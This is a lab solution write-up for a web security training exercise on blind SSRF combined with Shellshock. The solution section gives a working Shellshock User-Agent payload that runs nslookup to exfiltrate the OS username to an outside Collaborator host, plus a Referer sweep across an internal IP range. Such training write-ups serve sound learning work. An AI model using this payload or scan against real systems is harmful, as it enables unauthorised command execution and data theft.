# Lab: Blind SSRF with Shellshock exploitation

>This site uses analytics software which fetches the URL specified in the Referer header when a product page is loaded.

>To solve the lab, use this functionality to perform a blind SSRF attack against an internal server in the 192.168.0.X range on port 8080. In the blind attack, use a Shellshock payload against the internal server to exfiltrate the name of the OS user.


### Observations
**My Collaborator Url**: `wwwlamnqtk3yuqpxoj8zr6t82z8pwe.burpcollaborator.net`
**Vulnerable Area**: Referer header of `/product`

I didn't know what shellshock was so I found an article that describes it here: https://blog.cloudflare.com/inside-shellshock/

Based on the reading, this is the shellshock payload: `{ :; };`. Looks like we will put this payload in the User-Agent header. This payload allows us to execute whatever follows as a bash command.

From here, it is as simple as sending a specific request to each 192.168.0.X IP address
### Solution
- Send your `GET /product?productId=1` request to Burp intruder. 
- Change the user-agent header to `User-Agent: () { :; }; /usr/bin/nslookup $(whoami).wwwlamnqtk3yuqpxoj8zr6t82z8pwe.burpcollaborator.net` (but use your collaborator url)
- Set the referer header to `Referer: http://192.168.0.ยง1ยง:8080`
- Set your payload to all numbers between 1-255 to iterate over all IP addresses in 192.168.0.X
- Look at your burp collaborator client and look to find the OS user as a subdomain of your collaborator url

The user in my instance was named `peter-Yof9PR`, lab solved!